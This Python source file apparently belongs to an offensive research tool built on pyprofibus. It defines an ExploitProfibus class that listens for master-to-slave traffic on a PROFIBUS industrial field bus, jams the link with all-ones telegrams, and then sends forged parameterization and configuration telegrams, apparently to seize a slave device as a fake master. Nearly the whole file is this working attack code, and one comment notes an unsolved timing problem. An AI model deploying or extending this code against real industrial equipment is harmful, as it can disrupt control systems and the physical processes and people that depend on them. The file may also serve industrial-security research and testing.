from pyprofibus.attacker.exploit import Exploit
from pyprofibus.dp.dp import DpTelegram_SetPrm_Req
from pyprofibus.slave.Data_ExchState import Data_ExchState
from pyprofibus.slave.SlaveException import SlaveException
import time


class ExploitProfibus(Exploit):

    def listenForMasterToTargetCommunication(self):
        r_bytes = b''
        while True:
            while len(r_bytes) < 5:
                r_bytes += self.serial.read(5)
            if r_bytes[0] == 0x68 and r_bytes[4] == self.target_address:
                self.slave.phy.discard()
                break
            time.sleep(0.1)
        
    
    def disturbCommunication(self):
        self.slave.phy.sendData(self.telegram_all_one, None)
        print("Communication disturbed at time: %d" % time.time())
        time.sleep(0.2)
    
    def communicationBroke(self) -> bool:
        # x PROBLEM 2: the master goes in timeout with slave 1, the problem is that there is too much time between a disturbance and the other and the victim can communicate
        for i in range(10):
            self.read_bytes.append(self.serial.read(1))
            if len(self.read_bytes) == 7:
                if (self.read_bytes[0] == b'h') and (self.read_bytes[6] == b'\r'):
                    print("broken")
                    return True
                print(self.read_bytes)
                self.read_bytes.popleft()
        return False                        
    
    def sendParameterization(self):
        #telegram = self.slave.slaveDesc.setPrmTelegram
        #telegram.sa = self.fake_master_address
        #telegram.stationStatus = DpTelegram_SetPrm_Req.STA_LOCK # WD off
        print("Sending param")
        raw_telegram = self.prm_telegram.toFdlTelegram().getRawData()
        self.slave.phy.sendData(raw_telegram, None)
    
    def sendConfiguration(self):
        #telegram = self.slave.slaveDesc.chkCfgTelegram
        #telegram.sa = self.fake_master_address
        print("Sending config")
        raw_telegram = self.cfg_telegram.toFdlTelegram().getRawData()
        self.slave.phy.sendData(raw_telegram, None)